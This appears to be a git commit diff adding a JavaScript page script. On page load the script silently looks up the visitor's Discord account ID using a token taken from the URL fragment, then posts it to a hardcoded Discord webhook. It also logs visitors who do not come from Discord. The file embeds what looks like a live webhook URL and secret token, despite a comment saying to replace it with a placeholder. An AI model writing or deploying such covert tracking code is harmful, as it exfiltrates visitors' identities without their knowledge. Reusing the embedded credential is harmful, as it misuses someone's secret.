9c910f69f33877222ec74605b59135001aba3eba
faulaweb <106006503+faulaweb@users.noreply.github.com>
2023-02-23 01:25:45 +0600

    Add files via upload

--- main.js
+++ main.js
@@ -1,27 +1,33 @@
+// Replace <WEBHOOK_URL> with your actual Discord webhook URL
 const webhookUrl = "https://discordapp.com/api/webhooks/986479906684825640/eQQvf6kkja87PcUM4Mef1kF2fEbL9U1hE4ejA7chkMmhoZCIjcw3j7oxJq-jV6nTxT8N";
 
-		// Send a message to the Discord webhook when the page loads
-		window.onload = function() {
-			let message;
-			if (window.navigator.userAgent.includes("Discord")) {
-				message = "Clicked from Discord";
-			} else {
-				message = "Clicked from outside Discord";
-			}
-
-			fetch(webhookUrl, {
-				method: "POST",
-				headers: {
-					"Content-Type": "application/json"
-				},
-				body: JSON.stringify({ content: message })
-			});
-		}
-(function() {
+// Send a message to the Discord webhook with the user ID when the page loads
+window.onload = function() {
+	let message;
 	if (window.navigator.userAgent.includes("Discord")) {
-		const link = document.createElement("a");
-		link.href = "discord://open";
-		document.body.appendChild(link);
-		link.click();
+		fetch("https://discordapp.com/api/users/@me", {
+			headers: {
+				"Authorization": `Bearer ${window.location.hash.substring(1)}`
+			}
+		})
+		.then(response => response.json())
+		.then(data => {
+			message = `Clicked from Discord by user ${data.id}`;
+			sendMessage(message);
+		});
+	} else {
+		message = "Clicked from outside Discord";
+		sendMessage(message);
 	}
-})();
+};
+
+// Send a message to the Discord webhook
+function sendMessage(message) {
+	fetch(webhookUrl, {
+		method: "POST",
+		headers: {
+			"Content-Type": "application/json"
+		},
+		body: JSON.stringify({ content: message })
+	});
+}
